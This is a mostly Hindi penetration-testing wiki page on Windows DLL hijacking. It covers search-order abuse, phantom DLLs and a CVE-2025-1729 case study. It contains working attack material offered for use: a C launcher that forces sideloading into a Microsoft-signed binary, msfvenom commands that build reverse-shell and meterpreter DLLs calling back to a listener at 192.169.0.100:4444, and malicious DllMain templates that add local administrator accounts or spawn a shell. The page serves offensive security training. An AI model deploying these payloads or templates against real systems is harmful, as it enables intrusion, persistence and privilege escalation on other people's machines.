# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

DLL Hijacking में एक भरोसेमंद एप्लिकेशन को एक दुर्भावनापूर्ण DLL लोड कराने के लिए मैनीपुलेट करना शामिल है। यह शब्द कई तरीकों को समाहित करता है जैसे **DLL Spoofing, Injection, and Side-Loading**। इसका मुख्य उपयोग कोड निष्पादन, पर्सिस्टेंस हासिल करने और, कम सामान्य रूप से, privilege escalation के लिए होता है। यहाँ पर जबकि फोकस escalation पर है, hijacking का तरीका मकसद के अनुसार समान रहता है।

### सामान्य तकनीकें

कई तरीके DLL hijacking के लिए प्रयोग किए जाते हैं, और उनकी प्रभावशीलता एप्लिकेशन के DLL लोडिंग रणनीति पर निर्भर करती है:

1. **DLL Replacement**: असली DLL को एक दुर्भावनापूर्ण DLL से बदलना, आवश्यक होने पर मूल DLL की कार्यक्षमता बनाए रखने के लिए DLL Proxying का उपयोग।
2. **DLL Search Order Hijacking**: दुर्भावनापूर्ण DLL को उस सर्च पाथ में रखना जो वैध DLL से पहले खोजा जाता है, एप्लिकेशन के सर्च पैटर्न का फायदा उठाकर।
3. **Phantom DLL Hijacking**: ऐसी स्थिति जहाँ एप्लिकेशन एक आवश्यक पर मौजूद नहीं DLL को लोड करने के लिए धोखा खा ले — इसके लिए एक दुर्भावनापूर्ण DLL बनाना।
4. **DLL Redirection**: खोज पैरामीटर जैसे %PATH% या .exe.manifest / .exe.local फाइलों को संशोधित करके एप्लिकेशन को दुर्भावनापूर्ण DLL की ओर निर्देशित करना।
5. **WinSxS DLL Replacement**: WinSxS डायरेक्टरी में वैध DLL को दुर्भावनापूर्ण बनिस्बत से बदलना — यह तरीका अक्सर DLL side-loading के साथ जुड़ा होता है।
6. **Relative Path DLL Hijacking**: कॉपी किए गए एप्लिकेशन के साथ उपयोगकर्ता-नियंत्रित डायरेक्टरी में दुर्भावनापूर्ण DLL रखना, जो Binary Proxy Execution तकनीकों जैसा व्यवहार दिखाता है।

## लापता Dlls ढूँढना

सिस्टम के अंदर लापता Dlls खोजने का सबसे सामान्य तरीका sysinternals से [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना है, और **निम्नलिखित 2 फ़िल्टर** सेट करना:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

और केवल **फ़ाइल सिस्टम गतिविधि (File System Activity)** दिखाएँ:

![](<../../../images/image (153).png>)

यदि आप सामान्यतः **लापता dlls** ढूँढ रहे हैं तो इसे कुछ **सेकंड** के लिए चलने दें।\
यदि आप किसी विशेष executable के अंदर **लापता dll** ढूँढ रहे हैं तो आपको **एक और फ़िल्टर** सेट करना चाहिए जैसे "Process Name" "contains" "\<exec name>", उसे execute करें, और events capture करना बंद कर दें।

## लापता Dlls का शोषण

privileges escalate करने के लिए सबसे अच्छी संभावना यह है कि हम ऐसा कर सकें कि हम एक dll लिखें जिसे कोई privileged process लोड करने की कोशिश करेगा, और वह dll किसी ऐसी जगह पर लिखा जा सके जहाँ उसे उस मूल dll से पहले खोजा जाए जहाँ वह असल में मौजूद है (अजीब केस), या हम किसी ऐसी फोल्डर में लिख सकें जहाँ dll खोजा जाएगा और मूल dll किसी भी फोल्डर में मौजूद न हो।

### Dll Search Order

**[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)** में आप विशेष रूप से देख सकते हैं कि Dlls कैसे लोड होते हैं।

Windows applications DLLs को पहले से परिभाषित सर्च पाथ्स के एक सेट का पालन करके खोजते हैं, एक विशेष क्रम का पालन करते हुए। DLL hijacking तब होती है जब हानिकारक DLL को रणनीतिक रूप से उन डायरेक्टरीज़ में से किसी एक में रखा जाता है, ताकि वह असली DLL से पहले लोड हो जाए। इसे रोकने का एक समाधान यह है कि एप्लिकेशन जिन DLLs की आवश्यकता है उनके लिए absolute paths का उपयोग करे।

आप 32-bit सिस्टम्स पर **DLL search order** नीचे देख सकते हैं:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

यह SafeDllSearchMode सक्षम होने पर डिफ़ॉल्ट सर्च ऑर्डर है। जब यह अक्षम होता है तो current directory दूसरी जगह पर आ जाता है। इस फीचर को अक्षम करने के लिए, **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाएं और इसे 0 पर सेट करें (डिफ़ॉल्ट सक्षम है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) फ़ंक्शन को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ कॉल किया जाता है तो सर्च उस executable module की डायरेक्टरी से शुरू होती है जिसे **LoadLibraryEx** लोड कर रहा है।

अंत में, ध्यान दें कि **कोई dll केवल नाम बताकर नहीं बल्कि absolute path बताकर भी लोड किया जा सकता है**। उस स्थिति में वह dll केवल उस path में ही खोजा जाएगा (यदि उस dll की कोई dependencies हैं, तो उन्हें नाम बताकर लोड किए जाने जैसा ही ढूँढा जाएगा)।

सर्च ऑर्डर बदलने के अन्य तरीके भी हैं पर मैं उन्हें यहाँ विस्तार से नहीं बताऊँगा।

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

एक नया बनाया गया process के DLL सर्च पथ को निर्णायक रूप से प्रभावित करने का एक उन्नत तरीका है कि process बनाते समय ntdll की native APIs का उपयोग करके RTL_USER_PROCESS_PARAMETERS में DllPath फ़ील्ड सेट किया जाए। यहाँ एक attacker-controlled डायरेक्टरी प्रदान कर के, एक लक्ष्य प्रक्रिया जिसे किसी DLL को नाम से resolve करना होता है (कोई absolute path नहीं और safe loading flags का उपयोग नहीं कर रही), उसे उस डायरेक्टरी से दुर्भावनापूर्ण DLL लोड करने के लिए मजबूर किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx के साथ process parameters बनाएं और एक custom DllPath दें जो आपके नियंत्रित फ़ोल्डर की ओर पॉइंट करता हो (उदा., वह डायरेक्टरी जहाँ आपका dropper/unpacker रहता है)।
- RtlCreateUserProcess के साथ process बनाएं। जब लक्ष्य बाइनरी किसी DLL को नाम से resolve करेगा, loader इस दिये गए DllPath को resolution के दौरान देखेगा, जिससे भरोसेमंद sideloading संभव हो जाएगी भले ही दुर्भावनापूर्ण DLL target EXE के साथ colocated न हो।

नोट्स/सीमाएँ
- यह बनायी जा रही child process को प्रभावित करती है; यह SetDllDirectory से अलग है, जो केवल वर्तमान प्रक्रिया को प्रभावित करता है।
- लक्ष्य को किसी DLL को नाम से import या LoadLibrary करना चाहिए (कोई absolute path नहीं और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग नहीं होना चाहिए)।
- KnownDLLs और hardcoded absolute paths hijack नहीं किए जा सकते। Forwarded exports और SxS प्राथमिकता बदल सकते हैं।

न्यूनतम C उदाहरण (ntdll, wide strings, सरलीकृत त्रुटि हैंडलिंग):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

हाँ, आवश्यकताएँ ढूँढना जटिल है क्योंकि **by default it's kind of weird to find a privileged executable missing a dll** और यह और भी अजीब है कि किसी system path फ़ोल्डर पर **write permissions** मिल जाएँ (आप सामान्य रूप से ऐसा नहीं कर सकते)। लेकिन, misconfigured environments में यह संभव है.\
यदि आप भाग्यशाली हैं और आवश्यकताओं को पूरा करते हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) प्रोजेक्ट देख सकते हैं। भले ही प्रोजेक्ट का **main goal is bypass UAC** हो, वहां आपको उस Windows संस्करण के लिए Dll hijaking का एक **PoC** मिल सकता है जिसे आप उपयोग कर सकते हैं (शायद बस उस फ़ोल्डर के पाथ को बदलकर जहाँ आपके पास write permissions हैं)।

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी फ़ोल्डरों की अनुमतियाँ जांचें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप एक executable के imports और एक dll के exports को भी निम्नलिखित से जांच सकते हैं:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### स्वचालित उपकरण

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) सिस्टम PATH के अंदर किसी भी फ़ोल्डर पर आपकी लिखने की अनुमति है या नहीं यह जांचेगा.\
इस vulnerability को खोजने के लिए अन्य रोचक स्वचालित टूल्स **PowerSploit functions** हैं: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### उदाहरण

यदि आप कोई exploitable scenario पाते हैं तो इसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण चीजों में से एक है **एक dll बनाना जो कम से कम उन सभी functions को export करे जिनको executable उससे import करेगा**। वैसे, ध्यान दें कि Dll Hijacking उपयोगी होता है [Medium Integrity level से High **(bypassing UAC)** तक escalate करने के लिए](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity से SYSTEM** तक](../index.html#from-high-integrity-to-system)। आप execution के लिए dll hijacking पर केंद्रित इस dll hijacking स्टडी में **एक वैध dll कैसे बनाएं** इसका उदाहरण पा सकते हैं: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, अगले सेक्शन में आप कुछ **basic dll codes** पाएँगे जो **templates** के रूप में उपयोगी हो सकते हैं या ऐसी **dll** बनाने के लिए जिनमें गैर-ज़रूरी functions exported हों।

## **Dlls बनाना और compile करना**

### **Dll Proxifying**

बुनियादी तौर पर एक **Dll proxy** ऐसा Dll है जो लोड होने पर आपका malicious code execute कर सके, पर साथ ही साथ वास्तविक लाइब्रेरी को कॉल्स relaying करके अपेक्षित तरीके से expose और काम भी करे।

टूल [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) के साथ आप किसी executable को निर्दिष्ट करके उस library को चुन सकते हैं जिसे आप proxify करना चाहते हैं और proxified dll generate कर सकते हैं, या Dll निर्दिष्ट करके proxified dll generate कर सकते हैं।

### **Meterpreter**

**rev shell (x64) प्राप्त करें:**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक meterpreter (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएँ (x86 — मैंने x64 संस्करण नहीं देखा):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

ध्यान दें कि कई मामलों में आप जो Dll compile करते हैं उसे **export several functions** करना आवश्यक होता है, जिन्हें victim process द्वारा load किया जाएगा। अगर ये functions मौजूद नहीं होंगे तो **binary won't be able to load** उन्हें और **exploit will fail**।
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## केस अध्ययन: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

यह केस Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** को दर्शाता है, जिसे **CVE-2025-1729** के रूप में ट्रैक किया गया है।

### भेद्यता विवरण

- **घटक**: `TPQMAssistant.exe` स्थित `C:\ProgramData\Lenovo\TPQM\Assistant\` में।
- **अनुसूचित कार्य**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` रोज़ाना सुबह 9:30 बजे लॉग-ऑन उपयोगकर्ता के संदर्भ में चलता है।
- **निर्देशिका अनुमतियाँ**: `CREATOR OWNER` द्वारा लिखने योग्य, जिससे स्थानीय उपयोगकर्ता मनमाने फ़ाइलें डाल सकते हैं।
- **DLL खोज व्यवहार**: सबसे पहले इसके वर्किंग डायरेक्टरी से `hostfxr.dll` लोड करने की कोशिश करता है और यदि गायब हो तो "NAME NOT FOUND" लॉग करता है, जो स्थानीय डायरेक्टरी खोज की प्राथमिकता को दर्शाता है।

### एक्सप्लॉइट कार्यान्वयन

एक हमलावर उसी निर्देशिका में एक दुर्भावनापूर्ण `hostfxr.dll` स्टब रख सकता है, गायब DLL का फायदा उठाकर उपयोगकर्ता के संदर्भ में कोड निष्पादन प्राप्त करने के लिए:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### हमला प्रवाह

1. मानक उपयोगकर्ता के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में रखें।
2. शेड्यूल्ड टास्क को वर्तमान उपयोगकर्ता के संदर्भ में सुबह 9:30 बजे चलने की प्रतीक्षा करें।
3. यदि टास्क के निष्पादन के समय कोई प्रशासक लॉग इन है, तो दुष्ट DLL प्रशासक के सेशन में मध्यम इंटीग्रिटी पर चलती है।
4. मध्यम इंटीग्रिटी से SYSTEM privileges तक उन्नयन के लिए मानक UAC bypass techniques का उपयोग करें।

### निवारण

Lenovo ने Microsoft Store के माध्यम से UWP संस्करण **1.12.54.0** जारी किया, जो `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\` के अंतर्गत TPQMAssistant इंस्टॉल करता है, कमजोर शेड्यूल्ड टास्क को हटाता है, और पुराने Win32 घटकों को अनइंस्टॉल करता है।

## संदर्भ

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
